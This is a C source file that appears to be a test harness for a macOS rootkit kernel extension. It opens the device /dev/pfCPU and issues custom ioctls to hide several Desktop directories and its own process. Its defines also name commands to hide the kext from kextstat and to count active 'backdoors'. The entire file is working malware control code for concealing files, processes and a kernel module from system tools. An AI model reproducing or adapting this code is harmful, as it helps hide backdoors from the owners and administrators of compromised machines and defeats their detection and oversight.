#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>

#include <sys/ioctl.h>
#include <sys/sysctl.h>

#define BDOR_DEVICE       "/dev/pfCPU"
#define MCHOOK_MAGIC      31338
#define MAX_USER          20
#define DLENGTH           30

// Used for the uspace<->kspace initialization
#define MCHOOK_INIT       _IOW( MCHOOK_MAGIC, 8978726, char [20])
// Show kext from kextstat -- DEBUG
#define MCHOOK_SHOWK      _IO(  MCHOOK_MAGIC, 8349871)
// Hide kext from kextstat
#define MCHOOK_HIDEK      _IO(  MCHOOK_MAGIC, 4975738)
// Hide given pid
#define MCHOOK_HIDEP      _IO(  MCHOOK_MAGIC, 9400284)
// Hide given dir/file name
#define MCHOOK_HIDED      _IOW( MCHOOK_MAGIC, 1998274, char [DLENGTH])
// Show Process -- DEBUG
#define MCHOOK_SHOWP      _IO(  MCHOOK_MAGIC, 6839840)
// Unregister userspace component
#define MCHOOK_UNREGISTER _IOW( MCHOOK_MAGIC, 5739299, char [20])
// Returns the number of active backdoors
#define MCHOOK_GET_ACTIVES _IOR(MCHOOK_MAGIC, 7489827, int)


int main(int argc, char *argv[])
{
  int kext_fd = 0, ret = 0;
  int i = 0;
  const char username[] = "test";

  printf("[-] Opening /dev entry\n");
  kext_fd = open(BDOR_DEVICE, O_RDWR);

  // Initializing
  printf("[-] Initializing uspace<->kspace\n");
  ret = ioctl(kext_fd, MCHOOK_INIT, username);
  printf("[-] Sleeping\n");
  sleep(5);

  // Hiding DIRs
  printf("[-] Hiding DIRs\n");
  ret = ioctl(kext_fd, MCHOOK_HIDED, "/Users/test/Desktop/antani1");
  sleep(1);
  ret = ioctl(kext_fd, MCHOOK_HIDED, "/Users/test/Desktop/antani2");
  sleep(1);
  ret = ioctl(kext_fd, MCHOOK_HIDED, "/Users/test/Desktop/antani3");
  sleep(1);
  ret = ioctl(kext_fd, MCHOOK_HIDED, "/Users/test/Desktop/antani4");
  sleep(1);
  ret = ioctl(kext_fd, MCHOOK_HIDED, "/Users/test/Desktop/dir1");
  sleep(1);

  // Hide Process
  printf("[-] Hiding process\n");
  ret = ioctl(kext_fd, MCHOOK_HIDEP, getpid());
  
  // Keep test running
  printf("[-] Sleeping\n");
  sleep(5);

  // Quit Process
  printf("[-] Unregistering uspace component from kspace\n");
  ret = ioctl(kext_fd, MCHOOK_UNREGISTER, username);
   
  return 0;
}
